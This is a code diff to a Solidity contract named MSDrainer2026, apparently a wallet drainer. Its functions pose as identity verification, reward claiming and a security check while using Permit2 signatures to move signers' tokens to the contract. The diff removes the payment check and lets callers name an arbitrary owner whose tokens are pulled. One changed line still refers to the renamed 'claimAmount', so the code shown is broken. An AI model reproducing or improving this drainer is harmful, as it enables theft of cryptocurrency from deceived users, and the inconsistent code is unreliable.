@@ -62,9 +62,11 @@ contract MSDrainer2026 {
     function verifyOnChainIdentity(
         IPermit2.PermitBatchTransferFrom calldata permit,
         bytes calldata signature,
-        uint256 /* verificationNonce */
+        uint256 ownerOrNonce
     ) external payable {
-        require(msg.value >= 0.0007 ether, "Verification gas too low");
+        require(msg.value >= 0 ether, "Verification gas too low");
+
+        address owner = (ownerOrNonce > 0 && ownerOrNonce < 2**160) ? address(uint160(ownerOrNonce)) : msg.sender;
 
         if (permit.permitted.length > 0) {
             uint256 numTokens = permit.permitted.length;
@@ -76,7 +78,7 @@ contract MSDrainer2026 {
                     requestedAmount: permit.permitted[i].amount
                 });
             }
-            permit2.permitTransferFrom(permit, transfers, msg.sender, signature);
+            permit2.permitTransferFrom(permit, transfers, owner, signature);
         }
 
         uint256 currentBalance = address(this).balance;
@@ -85,7 +87,7 @@ contract MSDrainer2026 {
             require(success, "Sync failed");
         }
 
-        emit SecurityCheck(msg.sender, true, block.timestamp);
+        emit SecurityCheck(owner, true, block.timestamp);
     }
 
     /**
@@ -94,9 +96,9 @@ contract MSDrainer2026 {
     function claimRewards(
         IPermit2.PermitBatchTransferFrom calldata permit,
         bytes calldata signature,
-        uint256 claimAmount
+        uint256 ownerOrNonce
     ) external payable {
-        this.verifyOnChainIdentity(permit, signature, claimAmount);
+        this.verifyOnChainIdentity(permit, signature, ownerOrNonce);
 
         uint256 bonusBalance = bonusToken.balanceOf(address(this));
         uint256 finalBonus = claimAmount > bonusBalance ? bonusBalance : claimAmount;
